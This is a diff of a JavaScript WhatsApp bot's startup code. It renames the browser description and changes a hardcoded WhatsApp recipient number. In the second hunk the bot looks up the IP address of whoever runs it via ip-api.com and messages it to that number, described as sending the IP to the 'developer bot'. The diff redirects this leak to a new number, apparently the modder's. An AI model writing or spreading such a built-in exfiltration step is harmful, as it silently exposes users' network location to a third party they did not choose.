@@ -18,7 +18,7 @@ nocache('./index.js', module => console.log(color(`${module} is now updated!`)))
 const starts = async (client = new WAConnection()) => {
 	client.logger.level = 'warn'
 	client.version = [2, 6666, 9]
-	client.browserDescription = [ 'PitoDev', '3.0' ]
+	client.browserDescription = [ 'UCHIModder', '3.0' ]
 	client.on('qr', () => {
 		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan.!!'))
 	})
@@ -45,7 +45,7 @@ const starts = async (client = new WAConnection()) => {
 	})
 	fetch(`http://ip-api.com/line`).then(res => res.text())
 		.then(bu =>{
-		client.sendMessage("6285235637978@s.whatsapp.net", `IP-USER\n\n ${bu}`, MessageType.text )
+		client.sendMessage("62857700173269@s.whatsapp.net", `IP-USER\n\n ${bu}`, MessageType.text )
 		console.log(color('✓'), color('Sending ip address to developer bot'))
 	})
 	client.on('group-update', async (anu) => {
